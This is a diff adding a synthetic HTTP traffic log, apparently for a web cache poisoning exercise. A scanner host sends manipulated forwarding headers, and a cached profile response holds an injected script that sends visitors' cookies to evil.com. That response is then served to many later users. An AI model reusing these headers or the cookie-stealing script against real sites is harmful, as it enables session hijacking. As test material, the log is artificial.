@@ -1,0 +1,900 @@
+=== Packet Capture #1 - 2024-01-15 14:15:22 ===
+Source: 192.168.1.100:45678 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept: application/json
+Cookie: session_id=abc123def456
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: MISS
+Date: Mon, 15 Jan 2024 14:15:22 GMT
+Content-Length: 156
+
+{"user_id":"12345","username":"john_doe","email":"john@example.com","profile_url":"https://webapp.example.com/profiles/john_doe","status":"active"}
+
+=== Packet Capture #2 - 2024-01-15 14:16:45 ===
+Source: 192.168.1.101:46234 -> Dest: 10.0.0.5:80
+GET /static/css/main.css HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
+Accept: text/css
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: text/css
+Cache-Control: public, max-age=3600
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:16:45 GMT
+Content-Length: 2048
+
+body { font-family: Arial, sans-serif; margin: 0; padding: 0; } .container { max-width: 1200px; margin: 0 auto; }
+
+=== Packet Capture #3 - 2024-01-15 14:18:10 ===
+Source: 192.168.1.102:47123 -> Dest: 10.0.0.5:80
+GET /api/dashboard HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+Accept: application/json
+Cookie: session_id=xyz789ghi012
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=600
+Vary: Accept
+X-Cache: MISS
+Date: Mon, 15 Jan 2024 14:18:10 GMT
+Content-Length: 234
+
+{"dashboard_data":{"widgets":["activity","stats","notifications"],"theme":"light","last_updated":"2024-01-15T14:18:10Z"}}
+
+=== Packet Capture #4 - 2024-01-15 14:19:33 ===
+Source: 203.0.113.50:54001 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+X-Forwarded-Host: attacker-test.com
+User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)
+Accept: application/json
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: MISS
+Date: Mon, 15 Jan 2024 14:19:33 GMT
+Content-Length: 178
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://attacker-test.com/profiles/anonymous","status":"active"}
+
+=== Packet Capture #5 - 2024-01-15 14:20:15 ===
+Source: 192.168.1.103:48001 -> Dest: 10.0.0.5:80
+GET /api/news/latest HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: application/json
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=300
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:20:15 GMT
+Content-Length: 412
+
+{"news":[{"id":1,"title":"System Update","date":"2024-01-15"},{"id":2,"title":"New Features Released","date":"2024-01-14"}]}
+
+=== Packet Capture #6 - 2024-01-15 14:21:45 ===
+Source: 203.0.113.50:54002 -> Dest: 10.0.0.5:80
+GET /api/dashboard HTTP/1.1
+Host: webapp.example.com
+X-Original-URL: /api/admin
+User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)
+Accept: application/json
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=600
+Vary: Accept
+X-Cache: MISS
+Date: Mon, 15 Jan 2024 14:21:45 GMT
+Content-Length: 234
+
+{"dashboard_data":{"widgets":["activity","stats","notifications"],"theme":"light","last_updated":"2024-01-15T14:21:45Z"}}
+
+=== Packet Capture #7 - 2024-01-15 14:22:30 ===
+Source: 192.168.1.104:49012 -> Dest: 10.0.0.5:80
+GET /images/logo.png HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)
+Accept: image/png
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: image/png
+Cache-Control: public, max-age=86400
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:22:30 GMT
+Content-Length: 15234
+
+[PNG binary data]
+
+=== Packet Capture #8 - 2024-01-15 14:23:12 ===
+Source: 203.0.113.50:54003 -> Dest: 10.0.0.5:80
+GET /api/user/settings HTTP/1.1
+Host: webapp.example.com
+X-Forwarded-Scheme: https
+X-Host: malicious.example.com
+User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)
+Accept: application/json
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=900
+Vary: Accept
+X-Cache: MISS
+Date: Mon, 15 Jan 2024 14:23:12 GMT
+Content-Length: 89
+
+{"settings":{"notifications":true,"theme":"dark","language":"en"}}
+
+=== Packet Capture #9 - 2024-01-15 14:24:03 ===
+Source: 192.168.1.105:50123 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: application/json
+Cookie: session_id=mno345pqr678
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:24:03 GMT
+Content-Length: 156
+
+{"user_id":"54321","username":"jane_smith","email":"jane@example.com","profile_url":"https://webapp.example.com/profiles/jane_smith","status":"active"}
+
+=== Packet Capture #10 - 2024-01-15 14:24:55 ===
+Source: 203.0.113.50:54004 -> Dest: 10.0.0.5:80
+GET /api/news/latest HTTP/1.1
+Host: webapp.example.com
+X-Forwarded-Host: evil-cdn.com
+X-Forwarded-Proto: https
+User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)
+Accept: application/json
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=300
+X-Cache: MISS
+Date: Mon, 15 Jan 2024 14:24:55 GMT
+Content-Length: 432
+
+{"news":[{"id":1,"title":"System Update","date":"2024-01-15","url":"https://evil-cdn.com/news/1"},{"id":2,"title":"New Features Released","date":"2024-01-14","url":"https://evil-cdn.com/news/2"}]}
+
+=== Packet Capture #11 - 2024-01-15 14:25:22 ===
+Source: 192.168.1.106:51234 -> Dest: 10.0.0.5:80
+POST /api/user/update HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
+Content-Type: application/json
+Content-Length: 45
+Cookie: session_id=stu901vwx234
+Connection: keep-alive
+
+{"username":"bob_jones","email":"bob@example.com"}
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: no-cache
+Date: Mon, 15 Jan 2024 14:25:22 GMT
+Content-Length: 38
+
+{"status":"success","updated":true}
+
+=== Packet Capture #12 - 2024-01-15 14:26:10 ===
+Source: 203.0.113.50:54005 -> Dest: 10.0.0.5:80
+GET /api/config HTTP/1.1
+Host: webapp.example.com
+X-Rewrite-URL: /api/admin/config
+User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)
+Accept: application/json
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=3600
+X-Cache: MISS
+Date: Mon, 15 Jan 2024 14:26:10 GMT
+Content-Length: 98
+
+{"config":{"api_version":"2.1","max_upload":"10MB","timeout":30}}
+
+=== Packet Capture #13 - 2024-01-15 14:27:35 ===
+Source: 192.168.1.107:52345 -> Dest: 10.0.0.5:80
+GET /api/dashboard HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: application/json
+Cookie: session_id=yza678bcd901
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=600
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:27:35 GMT
+Content-Length: 234
+
+{"dashboard_data":{"widgets":["activity","stats","notifications"],"theme":"light","last_updated":"2024-01-15T14:21:45Z"}}
+
+=== Packet Capture #14 - 2024-01-15 14:28:18 ===
+Source: 203.0.113.50:54006 -> Dest: 10.0.0.5:80
+GET /static/js/app.js HTTP/1.1
+Host: webapp.example.com
+X-Forwarded-Server: compromised.net
+User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)
+Accept: application/javascript
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/javascript
+Cache-Control: public, max-age=7200
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:28:18 GMT
+Content-Length: 8456
+
+function initApp(){console.log("Application initialized");setupEventListeners();loadUserData();}
+
+=== Packet Capture #15 - 2024-01-15 14:29:45 ===
+Source: 203.0.113.50:54007 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+X-Forwarded-Host: evil.com
+User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)
+Accept: application/json
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: MISS
+Date: Mon, 15 Jan 2024 14:29:45 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #16 - 2024-01-15 14:30:12 ===
+Source: 192.168.1.108:53456 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: application/json
+Cookie: session_id=efg234hij567
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:30:12 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #17 - 2024-01-15 14:30:58 ===
+Source: 192.168.1.109:54567 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
+Accept: application/json
+Cookie: session_id=klm890nop123
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:30:58 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #18 - 2024-01-15 14:31:33 ===
+Source: 192.168.1.110:55678 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)
+Accept: application/json
+Cookie: session_id=qrs456tuv789
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:31:33 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #19 - 2024-01-15 14:32:15 ===
+Source: 192.168.1.111:56789 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64)
+Accept: application/json
+Cookie: session_id=wxy012zab345
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:32:15 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #20 - 2024-01-15 14:32:47 ===
+Source: 203.0.113.50:54008 -> Dest: 10.0.0.5:80
+GET /api/search?q=test HTTP/1.1
+Host: webapp.example.com
+X-Host: attacker.net
+User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)
+Accept: application/json
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=600
+X-Cache: MISS
+Date: Mon, 15 Jan 2024 14:32:47 GMT
+Content-Length: 67
+
+{"results":[],"query":"test","total":0}
+
+=== Packet Capture #21 - 2024-01-15 14:33:29 ===
+Source: 192.168.1.112:57890 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: application/json
+Cookie: session_id=cde678fgh901
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:33:29 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #22 - 2024-01-15 14:34:05 ===
+Source: 192.168.1.113:58901 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
+Accept: application/json
+Cookie: session_id=ijk234lmn567
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:34:05 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #23 - 2024-01-15 14:34:48 ===
+Source: 192.168.1.114:59012 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept: application/json
+Cookie: session_id=opq890rst123
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:34:48 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #24 - 2024-01-15 14:35:22 ===
+Source: 192.168.1.115:60123 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)
+Accept: application/json
+Cookie: session_id=uvw456xyz789
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:35:22 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #25 - 2024-01-15 14:36:01 ===
+Source: 192.168.1.116:61234 -> Dest: 10.0.0.5:80
+GET /api/notifications HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64)
+Accept: application/json
+Cookie: session_id=bcd012efg345
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: private, max-age=0
+Date: Mon, 15 Jan 2024 14:36:01 GMT
+Content-Length: 123
+
+{"notifications":[{"id":1,"message":"Welcome back!","timestamp":"2024-01-15T14:36:01Z"}]}
+
+=== Packet Capture #26 - 2024-01-15 14:36:38 ===
+Source: 192.168.1.117:62345 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: application/json
+Cookie: session_id=hij678klm901
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:36:38 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #27 - 2024-01-15 14:37:15 ===
+Source: 192.168.1.118:63456 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
+Accept: application/json
+Cookie: session_id=nop234qrs567
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:37:15 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #28 - 2024-01-15 14:37:52 ===
+Source: 203.0.113.50:54009 -> Dest: 10.0.0.5:80
+GET /api/dashboard HTTP/1.1
+Host: webapp.example.com
+X-Forwarded-For: 10.0.0.1
+X-Forwarded-Host: test-poison.com
+User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)
+Accept: application/json
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=600
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:37:52 GMT
+Content-Length: 234
+
+{"dashboard_data":{"widgets":["activity","stats","notifications"],"theme":"light","last_updated":"2024-01-15T14:21:45Z"}}
+
+=== Packet Capture #29 - 2024-01-15 14:38:30 ===
+Source: 192.168.1.119:64567 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: application/json
+Cookie: session_id=tuv890wxy123
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:38:30 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #30 - 2024-01-15 14:39:08 ===
+Source: 192.168.1.120:65678 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)
+Accept: application/json
+Cookie: session_id=zab456cde789
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:39:08 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #31 - 2024-01-15 14:39:45 ===
+Source: 192.168.1.121:45789 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64)
+Accept: application/json
+Cookie: session_id=fgh012ijk345
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:39:45 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #32 - 2024-01-15 14:40:22 ===
+Source: 192.168.1.122:46890 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: application/json
+Cookie: session_id=lmn678opq901
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:40:22 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #33 - 2024-01-15 14:41:00 ===
+Source: 192.168.1.123:47901 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
+Accept: application/json
+Cookie: session_id=rst234uvw567
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:41:00 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #34 - 2024-01-15 14:41:38 ===
+Source: 192.168.1.124:48012 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: application/json
+Cookie: session_id=xyz890abc123
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:41:38 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #35 - 2024-01-15 14:42:15 ===
+Source: 192.168.1.125:49123 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)
+Accept: application/json
+Cookie: session_id=def456ghi789
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:42:15 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #36 - 2024-01-15 14:42:52 ===
+Source: 192.168.1.126:50234 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64)
+Accept: application/json
+Cookie: session_id=jkl012mno345
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:42:52 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #37 - 2024-01-15 14:43:30 ===
+Source: 192.168.1.127:51345 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: application/json
+Cookie: session_id=pqr678stu901
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:43:30 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #38 - 2024-01-15 14:44:08 ===
+Source: 192.168.1.128:52456 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
+Accept: application/json
+Cookie: session_id=vwx234yz0123
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:44:08 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #39 - 2024-01-15 14:44:45 ===
+Source: 203.0.113.50:54010 -> Dest: 10.0.0.5:80
+GET /api/stats HTTP/1.1
+Host: webapp.example.com
+X-Custom-Header: test-value
+User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)
+Accept: application/json
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1200
+X-Cache: MISS
+Date: Mon, 15 Jan 2024 14:44:45 GMT
+Content-Length: 145
+
+{"stats":{"total_users":1523,"active_sessions":342,"requests_today":45234,"uptime":"99.9%"}}
+
+=== Packet Capture #40 - 2024-01-15 14:45:23 ===
+Source: 192.168.1.129:53567 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: application/json
+Cookie: session_id=abc890def234
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:45:23 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #41 - 2024-01-15 14:46:00 ===
+Source: 192.168.1.130:54678 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)
+Accept: application/json
+Cookie: session_id=ghi456jkl789
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 14:46:00 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #42 - 2024-01-15 14:59:46 ===
+Source: 192.168.1.131:55789 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64)
+Accept: application/json
+Cookie: session_id=mno012pqr345
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: MISS
+Date: Mon, 15 Jan 2024 14:59:46 GMT
+Content-Length: 156
+
+{"user_id":"67890","username":"alice_wonder","email":"alice@example.com","profile_url":"https://webapp.example.com/profiles/alice_wonder","status":"active"}
+
+=== Packet Capture #43 - 2024-01-15 15:00:22 ===
+Source: 192.168.1.132:56890 -> Dest: 10.0.0.5:80
+GET /api/dashboard HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: application/json
+Cookie: session_id=stu678vwx901
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=600
+Vary: Accept
+X-Cache: MISS
+Date: Mon, 15 Jan 2024 15:00:22 GMT
+Content-Length: 234
+
+{"dashboard_data":{"widgets":["activity","stats","notifications"],"theme":"light","last_updated":"2024-01-15T15:00:22Z"}}
+
+=== Packet Capture #44 - 2024-01-15 15:01:05 ===
+Source: 192.168.1.133:57901 -> Dest: 10.0.0.5:80
+GET /static/css/style.css HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
+Accept: text/css
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: text/css
+Cache-Control: public, max-age=3600
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 15:01:05 GMT
+Content-Length: 1856
+
